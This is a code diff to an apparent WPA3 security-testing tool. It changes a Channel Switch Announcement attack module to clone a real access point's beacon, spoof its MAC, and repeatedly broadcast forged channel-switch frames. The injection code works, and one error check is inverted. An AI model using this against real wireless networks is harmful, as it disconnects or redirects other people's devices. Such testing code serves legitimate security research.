@@ -15,6 +15,7 @@
 #include "logger/report.h"
 #include "observer/observers.h"
 #include "observer/tshark_wrapper.h"
+#include "scan/active/scan_AP.h"
 #include "system/hw_capabilities.h"
 
 namespace wpa3_tester::CSA_attack{
@@ -25,27 +26,55 @@ using namespace chrono;
 
 using namespace observer::tshark;
 
+static Dot11Beacon with_sorted_ies(const Dot11Beacon &src) {
+	auto opts = src.options();
+	vector sorted_opts(opts.begin(), opts.end());
+	// ID 61 (HT Operation) excluded — contains primary channel, conflicts with CSA IE
+	//TODO reuse in mitm
+
+	erase_if(sorted_opts, [](const auto &o) {
+		const auto id = static_cast<uint8_t>(o.option());
+		return id != 0 && id != 1 && id != 3 && id != 5
+			&& id != 37 && id != 42 && id != 45 //&& id != 48 //FIXME to bez tagu 48/61 ho aspoň odpojilo.
+			&& id != 50 && id != 59
+			&& id != 127 && id != 221;
+	});
+	ranges::sort(sorted_opts, [](const auto &a, const auto &b) {
+		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
+	});
+
+	Dot11Beacon result;
+	result.addr1(src.addr1());
+	result.addr2(src.addr2());
+	result.addr3(src.addr3());
+	result.capabilities() = src.capabilities();
+	result.interval(src.interval());
+	result.timestamp(src.timestamp());
+
+	for (const auto &opt : sorted_opts)
+		result.add_option(opt);
+	return result;
+}
+
 RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &ssid, const Channel &ap_channel,
-						const Channel &new_channel, const int switch_count
+						const Channel &new_channel, const int switch_count,
+						const Dot11Beacon *src_beacon
 ){
-	Dot11Beacon beacon;
-	beacon.addr1(Dot11::BROADCAST);
-	beacon.addr2(ap_mac);
-	beacon.addr3(ap_mac);
-	beacon.ssid(ssid);
-	beacon.ds_parameter_set(ap_channel.ch_num);
+	Dot11Beacon b = src_beacon ? *src_beacon : Dot11Beacon{};
 
 	Dot11ManagementFrame::channel_switch_type cs;
 	cs.switch_mode = 1;
 	cs.new_channel = new_channel.ch_num;
 	cs.switch_count = switch_count;
-	beacon.channel_switch(cs);
+	b.channel_switch(cs);
+
+	b = with_sorted_ies(b);
+	b.addr1(Dot11::BROADCAST);
+	b.addr2(ap_mac);
+	b.addr3(ap_mac);
 
 	RadioTap radiotap{};
-	//const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
-	//radiotap.channel(freq_mhz, RadioTap::OFDM);
-	radiotap.inner_pdu(beacon);
-	//radiotap.flags(RadioTap::FCS); // tell driver to check FCS (can be invalid for some drivers)
+	radiotap.inner_pdu(b);
 	return radiotap;
 }
 
@@ -57,14 +86,18 @@ void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, c
 	PacketSender sender{iface_name};
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 
-	RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel);
+	scan::ScanAP scan_ap{};
+	scan_ap.bssid = ap_mac;
+	unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, scan_ap); //TODO hardcoded tscan_timeout
+	if(beacon){ log(LogLevel::ERROR, "not found beacon for reproduce");}
+	cout << "check_vulnerable called with:\n" << "AP MAC: " << ap_mac << "\n" << "STA MAC: " << sta_mac << "\n" <<
+		"Interface: " << iface_name << "\n" << "Channel: " << ap_channel.ch_num << "\n" << "SSID: " << ssid << endl;
+	RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel, 3, beacon.get());
 	while(steady_clock::now() < end_time && !g_interrupted.load()){
 		sender.send(csa_rt);
 		this_thread::sleep_for(milliseconds(ms_interval));
 	}
 
-	cout << "check_vulnerable called with:\n" << "AP MAC: " << ap_mac << "\n" << "STA MAC: " << sta_mac << "\n" <<
-			"Interface: " << iface_name << "\n" << "Channel: " << ap_channel.ch_num << "\n" << "SSID: " << ssid << endl;
 }
 
 // ----------------- MODULE functions ------------------
